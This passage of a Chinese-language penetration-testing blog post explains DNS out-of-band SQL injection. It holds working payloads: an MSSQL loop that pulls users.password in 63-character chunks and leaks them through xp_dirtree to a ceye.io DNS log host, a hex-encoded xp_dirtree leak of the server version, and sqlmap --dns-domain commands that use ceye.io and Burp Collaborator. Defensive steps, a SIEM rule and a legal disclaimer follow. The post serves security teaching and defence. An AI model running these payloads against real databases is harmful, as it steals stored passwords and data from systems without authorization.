+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@i</span> <span class="type">INT</span> <span class="operator">=</span> <span class="number">1</span>, <span class="variable">@chunk</span> <span class="type">VARCHAR</span>(<span class="number">63</span>), <span class="variable">@cmd</span> <span class="type">VARCHAR</span>(<span class="number">200</span>);</span><br><span class="line">WHILE <span class="variable">@i</span> <span class="operator">&lt;=</span> LEN((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span>))</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">SET</span> <span class="variable">@chunk</span> <span class="operator">=</span> <span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span>), <span class="variable">@i</span>, <span class="number">63</span>);</span><br><span class="line">    <span class="keyword">SET</span> <span class="variable">@cmd</span> <span class="operator">=</span> <span class="string">&#x27;master..xp_dirtree &#x27;&#x27;\\&#x27;</span> <span class="operator">+</span> <span class="variable">@chunk</span></span><br><span class="line">             <span class="operator">+</span> <span class="string">&#x27;.idx-&#x27;</span> <span class="operator">+</span> <span class="built_in">CAST</span>(<span class="variable">@i</span> <span class="keyword">AS</span> <span class="type">VARCHAR</span>) <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io\foo&#x27;&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">EXEC</span>(<span class="variable">@cmd</span>); <span class="keyword">SET</span> <span class="variable">@i</span> <span class="operator">=</span> <span class="variable">@i</span> <span class="operator">+</span> <span class="number">63</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>十六进制编码</strong>：用 <code>hex()</code> &#x2F; <code>CONVERT(VARBINARY)</code> 编码结果，避免空格和特殊字符破坏域名合法性。</p>
+<p><strong>多级标签</strong>：利用 <code>part1.part2.attacker.com</code> 结构一次携带更多信息（每级独立63上限）。</p>
+<hr>
+<h2 id="SQLMap实战：-dns-domain"><a href="#SQLMap实战：-dns-domain" class="headerlink" title="SQLMap实战：--dns-domain"></a>SQLMap实战：<code>--dns-domain</code></h2><p>SQLMap内置DNS外带，一条参数将盲注升级为DNS漏出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ceye.io</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page.php?id=1&quot;</span> \</span><br><span class="line">  --dns-domain <span class="string">&quot;your-id.ceye.io&quot;</span> --technique=B --current-db</span><br><span class="line"></span><br><span class="line"><span class="comment"># Burp Collaborator + 高级参数</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page.php?id=1&quot;</span> \</span><br><span class="line">  --dns-domain <span class="string">&quot;abc.burpcollaborator.net&quot;</span> --dbs --delay 2 --dns-port 5353</span><br></pre></td></tr></table></figure>
+
+<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><pre class="mermaid">flowchart TD
+    A[SQLMap注入DNS Payload] --> B[DB触发DNS查询]
+    B --> C[DNS递归到权威NS]
+    C --> D[SQLMap轮询API]
+    D --> E{新记录?}
+    E -->|是| F[解码域名获取数据]
+    E -->|否| D</pre>
+
+<h3 id="实战总流程"><a href="#实战总流程" class="headerlink" title="实战总流程"></a>实战总流程</h3><pre class="mermaid">flowchart TB
+    A[注册DNSLOG] --> B[发现注入点]
+    B --> C{DNS Payload触发?}
+    C -->|是| D[枚举库/表/列]
+    C -->|否| E[尝试SMB/HTTP信道]
+    D --> F[63字符分片拖字段]
+    F --> G[横向移动/收尾]</pre>
+
+<hr>
+<h2 id="常见坑点"><a href="#常见坑点" class="headerlink" title="常见坑点"></a>常见坑点</h2><p><strong>出站防火墙</strong>：数据库须能出站DNS&#x2F;HTTP&#x2F;SMB。企业内网策略、云安全组（AWS SG默认禁UDP 53出站）、容器NetworkPolicy均可阻断。</p>
+<p><strong>MySQL <code>secure_file_priv</code></strong>（5.7+）：<code>SHOW VARIABLES LIKE &#39;secure_file_priv&#39;</code> → <code>NULL</code> 则文件操作完全禁用；空串允许UNC外带。</p>
+<p><strong>特殊字符</strong>：DNS域名仅允许 <code>[a-zA-Z0-9\-]</code>，空格&#x2F;<code>@</code>&#x2F;<code>#</code> 须hex编码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> master..xp_dirtree <span class="string">&#x27;\\&#x27;</span> <span class="operator">+</span></span><br><span class="line">  <span class="keyword">CONVERT</span>(<span class="type">VARCHAR</span>(MAX), <span class="keyword">CONVERT</span>(<span class="type">VARBINARY</span>(MAX), @<span class="variable">@version</span>), <span class="number">2</span>)</span><br><span class="line">  <span class="operator">+</span> <span class="string">&#x27;.your-id.ceye.io\foo&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>DNS缓存</strong>：域名拼接时间戳&#x2F;随机数确保唯一，防止缓存导致不发出查询。</p>
+<p><strong>SMB版本</strong>：Win10+&#x2F;Server2016+默认禁用SMBv1，MySQL UNC路径可能协商失败。</p>
+<hr>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><h3 id="开发侧"><a href="#开发侧" class="headerlink" title="开发侧"></a>开发侧</h3><ul>
+<li><strong>参数化查询（Prepared Statement）</strong>：根治注入的唯一正解</li>
+<li><strong>最小权限</strong>：数据库账户不持有 <code>FILE</code>&#x2F;<code>SUPER</code>&#x2F;<code>sysadmin</code></li>
+<li><strong>禁用危险存储过程</strong>：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- MSSQL</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_dropextendedproc <span class="string">&#x27;xp_cmdshell&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_dropextendedproc <span class="string">&#x27;xp_dirtree&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_dropextendedproc <span class="string">&#x27;xp_fileexist&#x27;</span>;</span><br><span class="line"><span class="comment">-- Oracle</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> UTL_HTTP <span class="keyword">FROM</span> PUBLIC;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> UTL_INADDR <span class="keyword">FROM</span> PUBLIC;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> DBMS_LDAP <span class="keyword">FROM</span> PUBLIC;</span><br></pre></td></tr></table></figure>
+
+<h3 id="运维侧"><a href="#运维侧" class="headerlink" title="运维侧"></a>运维侧</h3><ul>
+<li><strong>出站白名单</strong>：数据库仅在业务必需时允许出站，封禁非必要DNS&#x2F;HTTP&#x2F;SMB</li>
+<li><strong>DNS安全监控</strong>：IDS&#x2F;IPS对非授权域名查询告警，关注超长随机子域名特征</li>
+<li><strong>数据库审计日志</strong>：记录所有存储过程调用与异常网络访问</li>
+<li><strong>SIEM规则参考</strong>：<code>dns.query.length &gt; 40 AND NOT IN known_domains | stats count by src_ip | where count &gt; 10</code></li>
+</ul>
+<hr>
+<h2 id="技术对比"><a href="#技术对比" class="headerlink" title="技术对比"></a>技术对比</h2><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>Union</th>
+<th>布尔盲注</th>
+<th>时间盲注</th>
+<th><strong>OOB外带</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>速度</td>
+<td>秒级</td>
+<td>分钟级</td>
+<td>小时级</td>
+<td>分钟级</td>
+</tr>
+<tr>
+<td>依赖条件</td>
+<td>页面回显</td>
+<td>二态差异</td>
+<td>无</td>
+<td>数据库可出站</td>
+</tr>
+<tr>
+<td>隐蔽性</td>
+<td>低</td>
+<td>中</td>
+<td>中</td>
+<td>高</td>
+</tr>
+<tr>
+<td>绕过WAF</td>
+<td>困难</td>
+<td>较易</td>
+<td>较易</td>
+<td>容易（载荷在网络层触发）</td>
+</tr>
+</tbody></table>
+<p>OOB外带价值不在于提速，更在于<strong>将不可能变为可能</strong>——当目标无回显、无状态差异且时间盲注耗时过长时，只要数据库能出网，数据就能外传。</p>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><blockquote>
+<p>本文所述技术仅供安全研究与授权渗透测试使用。未经系统所有者明确书面授权，对任何计算机系统实施本文所描述的攻击行为均属违法，可能触犯《中华人民共和国网络安全法》《刑法》第285条&#x2F;第286条等相关法律。作者不对任何滥用本文技术造成的法律后果承担责任。学习安全技术是为了更好地防御，而非攻击。请在合法实验环境（DVWA、SQLi-Labs、PentesterLab等）中实践，绝不触碰未授权目标。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Windows-privesc-token/" rel="prev" title="Windows提权：令牌窃取与模拟">
+                  <i class="fa fa-angle-left"></i> Windows提权：令牌窃取与模拟
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Intranet-tunnel-proxy/" rel="next" title="内网穿透与隧道技术汇总">
+                  内网穿透与隧道技术汇总 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
